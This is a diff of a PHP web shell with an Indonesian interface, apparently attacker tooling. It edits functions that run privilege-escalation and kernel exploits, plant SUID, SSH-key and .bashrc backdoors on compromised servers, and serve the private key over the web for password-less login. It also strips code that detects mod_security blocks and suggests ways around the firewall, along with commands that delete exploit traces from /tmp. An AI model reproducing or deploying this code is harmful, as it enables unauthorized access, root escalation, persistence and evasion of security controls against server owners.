@@ -1189,11 +1189,6 @@ if (isset($_POST['action']) && $_POST['action'] === 'auto_collect_root_data') {
         $method = $_POST['method'] ?? '';
         $target = $_POST['target'] ?? '';
         
-        // 🧹 CLEANUP: Hapus file exploit dan SUID lama sebelum eksekusi baru
-        execute_shell_command('rm -rf /tmp/CVE-* /tmp/pwn* /tmp/exploit* /tmp/.exploit_* 2>/dev/null');
-        execute_shell_command('rm -f /tmp/.hidden_root /tmp/.sysd /tmp/.bash /tmp/.al-* /dev/shm/.sysd 2>/dev/null');
-        execute_shell_command('rm -f /tmp/pwn.c /tmp/exploit.c /tmp/*.so /tmp/malicious.* 2>/dev/null');
-        
         // Step 1: Execute the exploit
         $exploit_result = execute_privesc_exploit($method, $target);
         
@@ -1247,10 +1242,6 @@ if (isset($_POST['action']) && $_POST['action'] === 'kernel_exploit_auto_collect
         header('Content-Type: application/json');
         $binary_path = $_POST['binary'] ?? '';
         $method = $_POST['method'] ?? 'binary';
-        
-        // 🧹 CLEANUP: Hapus file exploit dan SUID lama sebelum eksekusi baru
-        execute_shell_command('rm -rf /tmp/CVE-* /tmp/pwn* /tmp/exploit* /tmp/.exploit_* 2>/dev/null');
-        execute_shell_command('rm -f /tmp/.hidden_root /tmp/.sysd /tmp/.bash /tmp/.al-* /dev/shm/.sysd 2>/dev/null');
         
         if (!$binary_path || !file_exists($binary_path)) {
             echo json_encode(['success' => false, 'output' => 'Binary not found: ' . $binary_path]);
@@ -1364,12 +1355,6 @@ if (isset($_POST['action']) && $_POST['action'] === 'kernel_auto_compile') {
         header('Content-Type: application/json');
         $cve = $_POST['cve'] ?? '';
         $kernel_version = $_POST['kernel_version'] ?? '';
-        
-        // 🧹 CLEANUP: Hapus file exploit lama sebelum kompilasi baru
-        execute_shell_command('rm -rf /tmp/CVE-* /tmp/pwn* /tmp/exploit* /tmp/.exploit_* 2>/dev/null');
-        execute_shell_command('rm -f /tmp/.hidden_root /tmp/.sysd /tmp/.bash /tmp/.al-* 2>/dev/null');
-        execute_shell_command('rm -f /tmp/pwn.c /tmp/exploit.c /tmp/*.so 2>/dev/null');
-        
         $result = auto_compile_kernel_exploit($cve, $kernel_version);
         echo json_encode($result);
     } catch (Exception $e) {
@@ -2225,17 +2210,6 @@ function scan_env_variables() {
 function auto_compile_kernel_exploit($cve, $kernel_version) {
     $results = ['success' => false, 'output' => '', 'compiled_binary' => '', 'method' => ''];
     $arch = php_uname('m');
-    
-    // 🧹 CLEANUP: Hapus file exploit lama sebelum mulai
-    // Hapus folder exploit hasil kompilasi sebelumnya
-    execute_shell_command('rm -rf /tmp/CVE-* /tmp/pwn* /tmp/exploit* /tmp/compile_* /tmp/kernel* /tmp/.exploit_* 2>/dev/null');
-    // Hapus SUID backdoor dan file serupa
-    execute_shell_command('rm -f /tmp/.hidden_root /tmp/.sysd /tmp/.bash /tmp/.al-sysd /tmp/.al_*.sh /dev/shm/.sysd /dev/shm/.hidden_root 2>/dev/null');
-    // Hapus source code dan binary exploit lama
-    execute_shell_command('rm -f /tmp/pwn.c /tmp/exploit.c /tmp/*.so /tmp/malicious.c /tmp/malicious.so 2>/dev/null');
-    // Hapus binary hasil kompilasi
-    execute_shell_command('rm -f /tmp/keyring /tmp/usbmidi /tmp/dirtycow /tmp/chocobo /tmp/socksend /tmp/dccp /tmp/packet /tmp/ptmx /tmp/bpf 2>/dev/null');
-    
     $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
     @mkdir($tmp_dir);
     
@@ -2636,12 +2610,6 @@ function scan_advanced_privesc() {
 
 function execute_privesc_exploit($method, $target) {
     $result = ['success' => false, 'output' => '', 'method' => $method];
-    
-    // 🧹 LIGHT CLEANUP: Hapus file-file sementara yang mungkin mengganggu
-    // Hanya hapus file yang paling umum dan berpotensi konflik
-    @unlink('/tmp/malicious.so');
-    @unlink('/tmp/malicious.c');
-    @unlink('/tmp/.al_' . getmypid() . '.sh');
     
     switch ($method) {
         case 'suid':
@@ -3252,23 +3220,6 @@ YW5kb21AaG9zdAEC
     @file_put_contents($private_key_path, $private_key_content);
     @chmod($private_key_path, 0600);
     
-    // Generate SSH documentation
-    $ssh_doc = "=== SSH BACKDOOR ACCESS ===\n";
-    $ssh_doc .= "Tanggal: " . date('Y-m-d H:i:s') . "\n";
-    $ssh_doc .= "Server: $host\n";
-    $ssh_doc .= "User: " . get_current_user() . "\n\n";
-    $ssh_doc .= "CARA MENGGUNAKAN:\n";
-    $ssh_doc .= "1. Download private key dari:\n";
-    $ssh_doc .= "   $protocol://$host$base_path/.ssh_key_backdoor\n\n";
-    $ssh_doc .= "2. Simpan sebagai 'backdoor.key' dan set permission:\n";
-    $ssh_doc .= "   chmod 600 backdoor.key\n\n";
-    $ssh_doc .= "3. Connect via SSH:\n";
-    $ssh_doc .= "   ssh -i backdoor.key " . get_current_user() . "@$host\n\n";
-    $ssh_doc .= "CATATAN:\n";
-    $ssh_doc .= "- Key hanya berfungsi jika SSH server aktif di target\n";
-    $ssh_doc .= "- Jika gagal, coba port lain (22, 2222, 443, dll)\n";
-    $ssh_doc .= "-authorized_keys path: $auth_keys\n";
-    
     $results['ssh'] = [
         'status' => $key_installed ? 'installed' : 'failed',
         'path' => $auth_keys,
@@ -3277,6 +3228,29 @@ YW5kb21AaG9zdAEC
         'private_key_url' => "$protocol://$host$base_path/.ssh_key_backdoor",
         'private_key_filename' => 'backdoor.key'
     ];
+    
+    // Build SSH documentation
+    $ssh_doc = "SSH BACKDOOR DOCUMENTATION\n";
+    $ssh_doc .= "==========================\n\n";
+    $ssh_doc .= "Status: " . ($key_installed ? 'INSTALLED' : 'FAILED') . "\n";
+    $ssh_doc .= "Tanggal Install: " . date('Y-m-d H:i:s') . "\n";
+    $ssh_doc .= "Server: $host\n";
+    $ssh_doc .= "User: " . get_current_user() . "\n\n";
+    $ssh_doc .= "=== PUBLIC KEY ===\n";
+    $ssh_doc .= "Path: $auth_keys\n";
+    $ssh_doc .= "Key: $backdoor_key\n\n";
+    $ssh_doc .= "=== PRIVATE KEY ===\n";
+    $ssh_doc .= "Download URL: $protocol://$host$base_path/.ssh_key_backdoor\n";
+    $ssh_doc .= "Local Path: $private_key_path\n\n";
+    $ssh_doc .= "=== CARA MENGGUNAKAN ===\n";
+    $ssh_doc .= "1. Download private key dari URL di atas\n";
+    $ssh_doc .= "2. Simpan dengan nama 'backdoor.key'\n";
+    $ssh_doc .= "3. chmod 600 backdoor.key\n";
+    $ssh_doc .= "4. ssh -i backdoor.key " . get_current_user() . "@$host\n\n";
+    $ssh_doc .= "=== CATATAN ===\n";
+    $ssh_doc .= "- Login langsung tanpa password\n";
+    $ssh_doc .= "- Key pair unik untuk server ini\n";
+    $ssh_doc .= "- Private key juga tersimpan di: $private_key_path\n";
     
     // Bashrc backdoor
     $bashrc = $home . '/.bashrc';
@@ -3522,187 +3496,30 @@ if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['fi
     header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
     exit;
 }
-// 🎯 ENHANCED FILE UPload with detailed error handling
 if (isset($_FILES['upload_file'])) {
     $uploadedCount = 0;
     $failedCount = 0;
     $fileCount = count($_FILES['upload_file']['name']);
-    $uploadErrors = [];
-    $uploadedFiles = [];
-    $failedFiles = [];
     
-    // 🎯 DETEKSI MOD_SECURITY / FIREWALL BLOCK
-    // Jika $_FILES ada tapi kosong, kemungkinan diblok firewall
-    if (empty($_FILES['upload_file']['name'][0]) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-        // Cek apakah ada header mod_security (jika getallheaders tersedia)
-        $modsecHit = false;
-        if (function_exists('getallheaders')) {
-            foreach (getallheaders() as $header => $value) {
-                if (stripos($header, 'mod_security') !== false || 
-                    stripos($header, 'x-mod-sec') !== false ||
-                    stripos($value, '403') !== false) {
-                    $modsecHit = true;
-                    break;
-                }
-            }
-        }
-        
-        $output = "[ERROR] Upload blocked by server firewall!\n\n";
-        if ($modsecHit) {
-            $output .= "Server firewall (mod_security) blocked the upload.\n";
-        } else {
-            $output .= "Server firewall (LiteSpeed/Apache/Nginx) blocked the upload.\n";
-        }
-        $output .= "\nPossible reasons:\n";
-        $output .= "- File content flagged as suspicious\n";
-        $output .= "- File extension blacklisted\n";
-        $output .= "- File size exceeds server limit\n";
-        $output .= "- WAF rule triggered\n\n";
-        $output .= "Workarounds:\n";
-        $output .= "1. Rename file to .txt or .bak first\n";
-        $output .= "2. Compress as .zip file\n";
-        $output .= "3. Use Base64 encoding via shell\n";
-        $output .= "4. Split file into smaller chunks\n";
-    } else {
-    
-    // Define upload error messages
-    $uploadErrorMessages = [
-        UPLOAD_ERR_OK => 'Success',
-        UPLOAD_ERR_INI_SIZE => 'File too large (exceeds upload_max_filesize)',
-        UPLOAD_ERR_FORM_SIZE => 'File too large (exceeds MAX_FILE_SIZE)',
-        UPLOAD_ERR_PARTIAL => 'File partially uploaded',
-        UPLOAD_ERR_NO_FILE => 'No file uploaded (possibly blocked by firewall)',
-        UPLOAD_ERR_NO_TMP_DIR => 'Missing temp folder',
-        UPLOAD_ERR_CANT_WRITE => 'Failed to write file',
-        UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
-    ];
-    
-    // Check if directory is writable
-    if (!is_writable($dir)) {
-        $output = "[ERROR] Upload failed: Directory not writable. Check permissions.";
-        $output .= "\n[TIP] Try uploading to /tmp/ instead.";
-    } else {
-        // Check available disk space (minimum 1MB)
-        $freeSpace = @disk_free_space($dir);
-        if ($freeSpace !== false && $freeSpace < 1024 * 1024) {
-            $output = "[ERROR] Upload failed: Insufficient disk space (< 1MB free).";
-        } else {
-            for ($i = 0; $i < $fileCount; $i++) {
-                $fileName = $_FILES['upload_file']['name'][$i];
-                $fileError = $_FILES['upload_file']['error'][$i];
-                $fileSize = $_FILES['upload_file']['size'][$i];
-                
-                if ($fileError === UPLOAD_ERR_OK) {
-                    // Validate file size (max 100MB)
-                    $maxSize = 100 * 1024 * 1024; // 100MB
-                    if ($fileSize > $maxSize) {
-                        $failedCount++;
-                        $failedFiles[] = [
-                            'name' => $fileName,
-                            'reason' => 'File too large (max 100MB)'
-                        ];
-                        continue;
-                    }
-                    
-                    // Check for path traversal
-                    $baseName = basename($fileName);
-                    if ($baseName !== $fileName) {
-                        $failedCount++;
-                        $failedFiles[] = [
-                            'name' => $fileName,
-                            'reason' => 'Path traversal detected'
-                        ];
-                        continue;
-                    }
-                    
-                    $target = $dir . DIRECTORY_SEPARATOR . $baseName;
-                    
-                    // Check if file already exists
-                    $isOverwrite = file_exists($target);
-                    
-                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
-                        // 🎯 VERIFIKASI AKTUAL: Pastikan file benar-benar ada dan ukurannya benar
-                        clearstatcache(true, $target);
-                        if (file_exists($target) && is_file($target)) {
-                            $actualSize = filesize($target);
-                            if ($actualSize == $fileSize) {
-                                $uploadedCount++;
-                                $uploadedFiles[] = [
-                                    'name' => $baseName,
-                                    'size' => $fileSize,
-                                    'overwrite' => $isOverwrite
-                                ];
-                            } else {
-                                // File exists tapi ukuran beda = corrupt/partial
-                                $failedCount++;
-                                $failedFiles[] = [
-                                    'name' => $fileName,
-                                    'reason' => 'File size mismatch (expected: ' . format_bytes($fileSize) . ', got: ' . format_bytes($actualSize) . ')'
-                                ];
-                                // Hapus file corrupt
-                                @unlink($target);
-                            }
-                        } else {
-                            // File tidak ada setelah move (aneh, tapi mungkin terjadi)
-                            $failedCount++;
-                            $failedFiles[] = [
-                                'name' => $fileName,
-                                'reason' => 'File disappeared after upload (possible antivirus deletion)'
-                            ];
-                        }
-                    } else {
-                        $failedCount++;
-                        $lastError = error_get_last();
-                        $errorMsg = ($lastError && isset($lastError['message'])) ? $lastError['message'] : 'Unknown error';
-                        
-                        // Deteksi mod_security berdasarkan error message
-                        if (stripos($errorMsg, 'permission') !== false || 
-                            stripos($errorMsg, 'denied') !== false) {
-                            $errorMsg .= ' (Possible mod_security/antivirus block)';
-                        }
-                        
-                        $failedFiles[] = [
-                            'name' => $fileName,
-                            'reason' => 'Move failed: ' . $errorMsg
-                        ];
-                    }
-                } else {
-                    $failedCount++;
-                    $errorMsg = isset($uploadErrorMessages[$fileError]) ? $uploadErrorMessages[$fileError] : 'Unknown error (code: ' . $fileError . ')';
-                    $failedFiles[] = [
-                        'name' => $fileName,
-                        'reason' => $errorMsg
-                    ];
-                }
-            }
-            
-            // Build detailed output
-            if ($uploadedCount > 0 && $failedCount === 0) {
-                $output = "[SUCCESS] Upload successful: $uploadedCount file(s) uploaded.\n";
-                foreach ($uploadedFiles as $file) {
-                    $overwriteMark = $file['overwrite'] ? ' (overwritten)' : '';
-                    $sizeFormatted = format_bytes($file['size']);
-                    $output .= "   [FILE] {$file['name']} ($sizeFormatted)$overwriteMark\n";
-                }
-            } elseif ($uploadedCount > 0 && $failedCount > 0) {
-                $output = "[WARNING] Partial success: $uploadedCount uploaded, $failedCount failed.\n\n";
-                $output .= "Uploaded:\n";
-                foreach ($uploadedFiles as $file) {
-                    $overwriteMark = $file['overwrite'] ? ' (overwritten)' : '';
-                    $sizeFormatted = format_bytes($file['size']);
-                    $output .= "   [FILE] {$file['name']} ($sizeFormatted)$overwriteMark\n";
-                }
-                $output .= "\nFailed:\n";
-                foreach ($failedFiles as $file) {
-                    $output .= "   [FILE] {$file['name']}: {$file['reason']}\n";
-                }
+    for ($i = 0; $i < $fileCount; $i++) {
+        if ($_FILES['upload_file']['error'][$i] === UPLOAD_ERR_OK) {
+            $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name'][$i]);
+            if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
+                $uploadedCount++;
             } else {
-                $output = "[ERROR] Upload failed for all $failedCount file(s).\n\nDetails:\n";
-                foreach ($failedFiles as $file) {
-                    $output .= "   [FILE] {$file['name']}: {$file['reason']}\n";
-                }
+                $failedCount++;
             }
+        } else {
+            $failedCount++;
         }
+    }
+    
+    if ($uploadedCount > 0 && $failedCount === 0) {
+        $output = "✅ Upload successful: $uploadedCount file(s) uploaded.";
+    } elseif ($uploadedCount > 0 && $failedCount > 0) {
+        $output = "⚠️ Partial success: $uploadedCount uploaded, $failedCount failed.";
+    } else {
+        $output = "❌ Upload failed for all files.";
     }
 }
 if (isset($_POST['create_type'], $_POST['create_name'])) {
@@ -3730,27 +3547,6 @@ if (isset($_GET['download'])) {
         exit;
     }
 }
-// 🎯 CHECK IF FILE EXISTS (for upload overwrite confirmation)
-if (isset($_GET['check_file']) && isset($_GET['dir'])) {
-    header('Content-Type: application/json');
-    $checkDir = realpath($_GET['dir']);
-    $checkFile = basename($_GET['check_file']);
-    $filePath = $checkDir . DIRECTORY_SEPARATOR . $checkFile;
-    
-    if (file_exists($filePath) && is_file($filePath)) {
-        echo json_encode([
-            'exists' => true,
-            'name' => $checkFile,
-            'size' => filesize($filePath),
-            'size_formatted' => format_bytes(filesize($filePath)),
-            'modified' => date('Y-m-d H:i:s', filemtime($filePath))
-        ]);
-    } else {
-        echo json_encode(['exists' => false]);
-    }
-    exit;
-}
-
 if (isset($_POST['delete_target'])) {
     $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete_target'];
     if (is_dir($target)) {
@@ -4028,7 +3824,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2200</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 1814</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4127,77 +3923,7 @@ function list_dir($path) {
         <?php echo list_dir($dir) ?>
     </div>
 </div>
-<?php if (!empty($output)): 
-    // Determine color and status based on output prefix
-    $outputPrefix = isset($output[0]) ? $output[0] : '';
-    // Check first character to determine status
-    $firstChar = isset($output[0]) ? $output[0] : '';
-    if ($firstChar === '[' || strpos($output, 'Success') !== false) {
-        $borderColor = '#0f0';
-        $titleColor = '#0f0';
-        $statusText = 'Success';
-    } elseif (strpos($output, 'Warning') !== false || strpos($output, 'Partial') !== false) {
-        $borderColor = '#ff0';
-        $titleColor = '#ff0';
-        $statusText = 'Warning';
-    } elseif ($firstChar === 'E' || strpos($output, 'Failed') !== false || strpos($output, 'blocked') !== false) {
-        $borderColor = '#f44';
-        $titleColor = '#f44';
-        $statusText = 'Error';
-    } else {
-        $borderColor = '#6cf';
-        $titleColor = '#6cf';
-        $statusText = 'Info';
-    }
-?>
-<div id="uploadOutput" style="
-    position: fixed;
-    top: 20px;
-    right: 20px;
-    max-width: 400px;
-    max-height: 300px;
-    overflow: auto;
-    background: #1a1a1a;
-    border: 2px solid <?php echo $borderColor; ?>;
-    border-radius: 8px;
-    padding: 15px;
-    z-index: 9999;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    font-family: monospace;
-    font-size: 12px;
-    color: #0f0;
-    white-space: pre-wrap;
-    animation: slideIn 0.3s ease;
-">
-    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-        <span style="font-weight: bold; color: <?php echo $titleColor; ?>;">
-            <?php echo $statusText; ?>
-        </span>
-        <button onclick="this.parentElement.parentElement.remove();" style="background: none; border: none; color: #888; cursor: pointer; font-size: 16px;">×</button>
-    </div>
-    <?php echo nl2br(htmlspecialchars($output)); ?>
-</div>
-<style>
-@keyframes slideIn {
-    from { transform: translateX(100%); opacity: 0; }
-    to { transform: translateX(0); opacity: 1; }
-}
-#uploadOutput::-webkit-scrollbar { width: 8px; }
-#uploadOutput::-webkit-scrollbar-track { background: #111; }
-#uploadOutput::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
-</style>
-<script>
-// Auto-hide after 10 seconds
-setTimeout(() => {
-    const el = document.getElementById('uploadOutput');
-    if (el) {
-        el.style.transition = 'opacity 0.5s';
-        el.style.opacity = '0';
-        setTimeout(() => el.remove(), 500);
-    }
-}, 10000);
-</script>
-<?php endif; ?>
+<div class="output" style="display:none;"><?php echo htmlspecialchars($output) ?></div>
 <div class="modal" id="viewModal">
     <div class="modal-content">
         <div class="modal-header">
@@ -5593,77 +5319,10 @@ function sortTable(columnIndex) {
         return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
     }
     
-    // Check for existing files before upload
-    async function checkExistingFiles() {
-        const existingFiles = [];
-        for (const file of selectedFiles) {
-            try {
-                const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&check_file=' + encodeURIComponent(file.name) + '&dir=<?php echo urlencode($dir) ?>');
-                const data = await response.json();
-                if (data.exists) {
-                    existingFiles.push({
-                        name: file.name,
-                        size: data.size
-                    });
-                }
-            } catch (e) {
-                // Ignore check errors, proceed with upload
-            }
-        }
-        return existingFiles;
-    }
-    
     // Handle form submission with FormData
-    uploadForm.addEventListener('submit', async function(e) {
+    uploadForm.addEventListener('submit', function(e) {
         e.preventDefault();
         if (selectedFiles.length === 0) return;
-        
-        // 🎯 CLIENT-SIDE VALIDATION
-        const maxFileSize = 100 * 1024 * 1024; // 100MB
-        const invalidFiles = [];
-        
-        selectedFiles.forEach(file => {
-            if (file.size > maxFileSize) {
-                invalidFiles.push({
-                    name: file.name,
-                    reason: 'File too large (max 100MB)'
-                });
-            }
-        });
-        
-        if (invalidFiles.length > 0) {
-            showUploadResult({
-                type: 'error',
-                title: '❌ Validation Failed',
-                message: 'Some files exceed the maximum size:',
-                details: invalidFiles.map(f => `📄 ${f.name}: ${f.reason}`).join('\n')
-            });
-            return;
-        }
-        
-        // 🎯 CHECK FOR EXISTING FILES
-        const existingFiles = await checkExistingFiles();
-        if (existingFiles.length > 0) {
-            const confirmMsg = `⚠️ ${existingFiles.length} file(s) already exist:\n` +
-                existingFiles.map(f => `   📄 ${f.name}`).join('\n') +
-                `\n\nDo you want to overwrite them?`;
-            
-            if (!confirm(confirmMsg)) {
-                // Remove existing files from selection
-                const existingNames = existingFiles.map(f => f.name);
-                selectedFiles = selectedFiles.filter(f => !existingNames.includes(f.name));
-                updateFileList();
-                
-                if (selectedFiles.length === 0) {
-                    showUploadResult({
-                        type: 'info',
-                        title: '[INFO] Upload Cancelled',
-                        message: 'All selected files already exist and overwrite was cancelled.'
-                    });
-                    return;
-                }
-            }
-        }
         
         const formData = new FormData(uploadForm);
         // Clear existing files and add selected files
@@ -5680,215 +5339,41 @@ function sortTable(columnIndex) {
             newFormData.append('upload_file[]', file);
         });
         
-        // Show loading state with progress simulation
+        // Show loading state
         submitBtn.disabled = true;
-        submitBtn.innerHTML = '⏳ Uploading 0%...';
-        
-        // Simulate progress (since fetch doesn't support progress natively)
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-            progress += Math.random() * 15;
-            if (progress > 90) progress = 90;
-            submitBtn.innerHTML = `⏳ Uploading ${Math.round(progress)}%...`;
-        }, 200);
+        submitBtn.innerHTML = '⏳ Uploading...';
         
         fetch('', {
             method: 'POST',
             body: newFormData
         })
-        .then(response => {
-            // 🎯 CEK HTTP STATUS TERLEBIH DAHULU
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-            }
-            return response.text();
-        })
+        .then(response => response.text())
         .then(html => {
-            clearInterval(progressInterval);
-            
-            // CEK JIKA RESPONSE MENGANDUNG ERROR PAGE (403, 500, etc)
-            const lowerHtml = html.toLowerCase();
-            const isForbidden = 
-                lowerHtml.includes('403 forbidden') || 
-                lowerHtml.includes('access denied') ||
-                lowerHtml.includes('mod_security') ||
-                lowerHtml.includes('modsecurity') ||
-                lowerHtml.includes('blocked') ||
-                lowerHtml.includes('litespeed') ||
-                lowerHtml.includes('security violation') ||
-                lowerHtml.includes('suspicious activity') ||
-                html.includes('<title>403</title>') ||
-                html.includes('<h1>Forbidden</h1>') ||
-                html.includes('has been blocked');
-            
-            if (isForbidden) {
-                submitBtn.innerHTML = '[BLOCKED]';
-                showUploadResult({
-                    type: 'error',
-                    title: '[ERROR] Upload Blocked by Server',
-                    message: 'Server firewall (mod_security/LiteSpeed) blocked the upload.',
-                    details: 'The file was rejected by server security rules.\n\nPossible causes:\n• File content detected as malicious\n• File extension blacklisted\n• File size too large for server\n• mod_security rule triggered\n\nTry:\n1. Rename file to .txt or .bak\n2. Compress as .zip\n3. Upload via Shell command instead'
-                });
-                return;
-            }
-            
             // Parse response to check for success/error
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
-            const outputEl = doc.getElementById('uploadOutput') || doc.querySelector('.output');
+            const output = doc.querySelector('.output');
             
-            let shouldRefresh = false;
-            
-            if (outputEl) {
-                const outputText = outputEl.textContent.trim();
-                const isSuccess = outputText.indexOf('[SUCCESS]') === 0;
-                const isWarning = outputText.indexOf('[WARNING]') === 0;
-                const isError = outputText.indexOf('[ERROR]') === 0;
-                
-                submitBtn.innerHTML = isSuccess ? '[SUCCESS] Completed!' : 
-                                      isWarning ? '[WARNING] Partial' : '[ERROR] Failed!';
-                
-                // Determine result type
-                let resultType = 'info';
-                if (isSuccess) {
-                    resultType = 'success';
-                    shouldRefresh = true;
-                } else if (isWarning) {
-                    resultType = 'warning';
-                    shouldRefresh = true;
-                } else if (isError) {
-                    resultType = 'error';
-                    shouldRefresh = false;
-                }
-                
-                // Show detailed result modal
-                showUploadResult({
-                    type: resultType,
-                    title: resultType === 'success' ? '[SUCCESS] Upload Successful' : 
-                           resultType === 'warning' ? '[WARNING] Partial Success' : 
-                           resultType === 'error' ? '[ERROR] Upload Failed' : '[INFO] Upload Result',
-                    message: outputText.split('\n')[0],
-                    details: outputText.split('\n').slice(1).join('\n')
-                });
+            if (output) {
+                alert(output.textContent.trim());
             } else {
-                // JIKA TIDAK ADA OUTPUT ELEMENT, JANGAN ASUMSI SUKSES
-                submitBtn.innerHTML = '[UNKNOWN] Status';
-                shouldRefresh = false;
-                showUploadResult({
-                    type: 'warning',
-                    title: '[WARNING] Upload Status Unknown',
-                    message: 'Cannot verify upload result from server response.',
-                    details: 'The server responded but no status information was found.\n\nPlease check the Files tab to verify if the upload succeeded.\n\nCommon causes:\n• Server error page returned\n• Response truncated\n• Network timeout'
-                });
+                alert('Upload completed!');
             }
             
-            // Reset form after delay
-            setTimeout(() => {
-                selectedFiles = [];
-                updateFileList();
-                fileInput.value = '';
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '📤 Upload <span id="fileCount">0</span> File(s)';
-                
-                // 🎯 HANYA REFRESH JIKA UPLOAD SUKSES (atau partial)
-                if (shouldRefresh) {
-                    window.location.reload();
-                }
-            }, 2000);
+            // Reset form
+            selectedFiles = [];
+            updateFileList();
+            fileInput.value = '';
+            
+            // Refresh page to show new files
+            window.location.reload();
         })
         .catch(error => {
-            clearInterval(progressInterval);
+            alert('Upload failed: ' + error.message);
             submitBtn.disabled = false;
             submitBtn.innerHTML = '📤 Upload ' + selectedFiles.length + ' File(s)';
-            
-            showUploadResult({
-                type: 'error',
-                title: '❌ Upload Failed',
-                message: 'Network error occurred',
-                details: error.message
-            });
         });
     });
-    
-    // 🎯 SHOW UPLOAD RESULT MODAL
-    function showUploadResult(result) {
-        // Remove existing modal if any
-        const existingModal = document.getElementById('uploadResultModal');
-        if (existingModal) existingModal.remove();
-        
-        const colors = {
-            success: { bg: '#0f0', text: '#000', border: '#0f0' },
-            warning: { bg: '#ff0', text: '#000', border: '#ff0' },
-            error: { bg: '#f44', text: '#fff', border: '#f44' },
-            info: { bg: '#6cf', text: '#000', border: '#6cf' }
-        };
-        
-        const color = colors[result.type] || colors.info;
-        
-        const modal = document.createElement('div');
-        modal.id = 'uploadResultModal';
-        modal.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        `;
-        
-        modal.innerHTML = `
-            <div style="
-                background: #1a1a1a;
-                border: 2px solid ${color.border};
-                border-radius: 8px;
-                padding: 20px;
-                max-width: 500px;
-                max-height: 80vh;
-                overflow: auto;
-                box-shadow: 0 0 20px ${color.border}40;
-            ">
-                <h3 style="margin: 0 0 15px 0; color: ${color.bg}; font-size: 18px;">${result.title}</h3>
-                <p style="margin: 0 0 10px 0; color: #fff; font-size: 14px;">${escapeHtml(result.message)}</p>
-                ${result.details ? `
-                    <div style="
-                        background: #000;
-                        border: 1px solid #333;
-                        border-radius: 4px;
-                        padding: 10px;
-                        margin-top: 10px;
-                        max-height: 200px;
-                        overflow: auto;
-                        font-family: monospace;
-                        font-size: 12px;
-                        color: #0f0;
-                        white-space: pre-wrap;
-                    ">${escapeHtml(result.details)}</div>
-                ` : ''}
-                <button onclick="this.closest('#uploadResultModal').remove();" style="
-                    margin-top: 15px;
-                    width: 100%;
-                    padding: 10px;
-                    background: ${color.bg};
-                    color: ${color.text};
-                    border: none;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    font-weight: bold;
-                ">OK</button>
-            </div>
-        `;
-        
-        document.body.appendChild(modal);
-        
-        // Close on background click
-        modal.addEventListener('click', (e) => {
-            if (e.target === modal) modal.remove();
-        });
-    }
 })();
 let currentSearchType = 'filename';
 let currentScanMode = 'standard';
@@ -6932,11 +6417,6 @@ async function autoGetRoot() {
     outputDiv.innerHTML = '';
     clearPrivescLog();
     
-    // 🧹 CLEANUP: Hapus file exploit lama sebelum mulai
-    outputDiv.innerHTML = '<span style="color:#6cf;">🧹 Cleaning up old exploit files...</span>\n';
-    await cleanupOldExploitFiles();
-    outputDiv.innerHTML += '<span style="color:#888;">✅ Cleanup complete</span>\n\n';
-    
     // 🔥 Helper: Count vulnerabilities per vector
     const countVectorVulns = (vector, data) => {
         if (!data) return 0;
@@ -7759,65 +7239,14 @@ function downloadRootData() {
 
 // 🔥 ADVANCED ATTACK FUNCTIONS
 
-// 🧹 CLEANUP: Hapus file exploit dan SUID backdoor lama sebelum eksekusi baru
-async function cleanupOldExploitFiles(log = null) {
-    const cleanupCmds = [
-        // Hapus folder exploit hasil kompilasi
-        'rm -rf /tmp/CVE-* 2>/dev/null',
-        'rm -rf /tmp/pwn* 2>/dev/null',
-        'rm -rf /tmp/exploit* 2>/dev/null',
-        'rm -rf /tmp/compile_* 2>/dev/null',
-        'rm -rf /tmp/kernel* 2>/dev/null',
-        'rm -rf /tmp/*.so 2>/dev/null',
-        
-        // Hapus SUID backdoor dan file serupa
-        'rm -f /tmp/.hidden_root /tmp/.sysd /tmp/.bash /tmp/.al-sysd /tmp/.al_* 2>/dev/null',
-        'rm -f /dev/shm/.sysd /dev/shm/.hidden_root /dev/shm/.bash 2>/dev/null',
-        'rm -f /var/tmp/.sysd /var/tmp/.hidden_root 2>/dev/null',
-        
-        // Hapus file script sementara
-        'rm -f /tmp/*.sh /tmp/.al_*.sh 2>/dev/null',
-        
-        // Hapus source code exploit
-        'rm -f /tmp/*.c /tmp/*.cpp /tmp/*.py /tmp/pwn.c /tmp/exploit.c 2>/dev/null',
-        
-        // Hapus data koleksi lama (jika sudah didownload)
-        'rm -rf /tmp/.root_data_* 2>/dev/null',
-        
-        // Hapus malicious.so dari LD_PRELOAD
-        'rm -f /tmp/malicious.so /tmp/malicious.c 2>/dev/null'
-    ];
-    
-    if (log) log('[*] Cleaning up old exploit files...', 'info');
-    
-    for (const cmd of cleanupCmds) {
-        try {
-            const formData = new FormData();
-            formData.append('cmd', cmd);
-            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
-            await fetch('', { method: 'POST', body: formData });
-        } catch (e) {
-            // Ignore cleanup errors
-        }
-    }
-    
-    if (log) log('[+] Cleanup complete', 'success');
-}
-
 async function kernelAutoCompile() {
